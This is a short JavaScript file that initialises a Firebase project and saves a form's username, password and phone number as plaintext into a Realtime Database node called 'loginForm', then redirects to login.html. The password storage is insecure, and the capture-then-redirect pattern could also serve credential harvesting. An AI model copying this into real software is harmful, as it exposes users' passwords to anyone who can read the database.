const firebaseConfig = {
    apiKey: "AIzaSyCXbJctLxiJ7sWC5sIexzKL1_bHe0w3nuQ",
    authDomain: "loginform-f46a8.firebaseapp.com",
    databaseURL: "https://loginform-f46a8-default-rtdb.firebaseio.com",
    projectId: "loginform-f46a8",
    storageBucket: "loginform-f46a8.appspot.com",
    messagingSenderId: "524823104100",
    appId: "1:524823104100:web:7f5e780e88593a4e02ad71"
  };

  firebase.initializeApp(firebaseConfig);

  var loginFOrmDB = firebase.database().ref('loginForm');
  document.getElementById('loginForm').addEventListener('submit',submitForm);
  

  function submitForm(e){
    e.preventDefault();
    
    var name = getElementVal('username');
    var password = getElementVal('password');
    var phone = getElementVal ('phone');
    
    saveData(name,password,phone);
    window.location.href = 'login.html'
}

const saveData = (name,password,phone) => {
    var newLoginForm = loginFOrmDB.push();

    newLoginForm.set({
        name : name,
        password : password,
        phone : phone,
    });

};

  const getElementVal = (id) => {
    return document.getElementById(id).value;
  }